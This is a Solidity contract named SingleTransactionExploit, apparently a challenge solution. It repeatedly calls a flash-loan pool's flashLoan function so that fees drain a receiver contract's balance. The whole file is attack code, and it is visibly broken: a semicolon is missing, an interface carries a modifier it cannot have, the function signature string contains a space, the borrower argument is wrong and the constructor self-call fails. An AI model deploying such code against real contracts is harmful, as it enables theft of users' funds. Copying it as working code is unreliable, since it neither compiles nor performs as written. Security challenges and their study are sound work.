pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IPoolFunc {
	function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant;
}


contract SingleTransactionExploit {
    using Address for address;

    address payable private pool;
	address payable private receiver;
	
	uint256 fee = 1;
	

   
    constructor(address payable poolAddress, address payable receiverAddress) {
        pool = poolAddress;
		receiver = receiverAddress;
		this.attack();
		
    }
	

    function attack() public payable {
		uint256 borrowAmount = 1
		uint256 fee = 1;
		
		uint8 counter = 0;
		uint8 max_iterations = 13;
		
		while(receiver.balance >= fee) {
			pool.functionCall(
            abi.encodeWithSignature(
                "flashLoan(address, uint256)",
                pool, borrowAmount
				)
			);
			counter += 1;
			if (counter > max_iterations){
				break;
			}
		}	
	}
}
